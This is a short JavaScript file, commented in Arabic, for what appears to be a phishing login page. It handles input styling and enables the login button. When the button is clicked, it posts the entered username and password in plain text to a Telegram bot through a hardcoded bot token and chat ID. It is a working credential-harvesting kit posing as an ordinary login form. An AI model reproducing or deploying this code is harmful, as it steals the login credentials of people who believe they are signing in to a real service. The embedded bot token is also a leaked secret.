const inputs = document.querySelectorAll('.input');
const button = document.querySelector('.login-btn');

const TELEGRAM_BOT_TOKEN = "7957010074:AAHgLSwfezAgFwzbvnbWbJRsOcRXm01kDeM" // استبدلها بالتوكن الخاص بك
const TELEGRAM_CHAT_ID = "6687453395"; // استبدلها بمعرف الدردشة

const handleInputEvent = (event) => {
    const input = event.target;
    const span = input.closest('.login-user').querySelector('span');

    if (event.type === 'focus' || input.value.trim() !== '') {
        span.classList.add('span-active');
    } else {
        span.classList.remove('span-active');
    }

    // التحقق من الإدخال وتمكين الزر
    const [user, password] = inputs;
    button.disabled = !(user.value.trim() && password.value.trim().length >= 8);
};

// إرسال البيانات إلى تيليغرام
const sendToTelegram = () => {
    const [user, password] = inputs;
    const message = `🔒 **تسجيل دخول جديد**\n👤 *المستخدم:* ${user.value}\n🔑 *كلمة المرور:* ${password.value}`;
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const params = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown"
    };

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(params),
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert("✅ تم إرسال المعلومات بنجاح!");
        } else {
            alert("❌ فشل الإرسال! تحقق من إعدادات البوت.");
        }
    })
    .catch(error => console.error("خطأ في الإرسال:", error));
};

// تطبيق الأحداث
inputs.forEach((input) => {
    input.addEventListener('focus', handleInputEvent);
    input.addEventListener('focusout', handleInputEvent);
    input.addEventListener('input', handleInputEvent);
});

// تشغيل الإرسال عند الضغط على الزر
button.addEventListener("click", sendToTelegram);
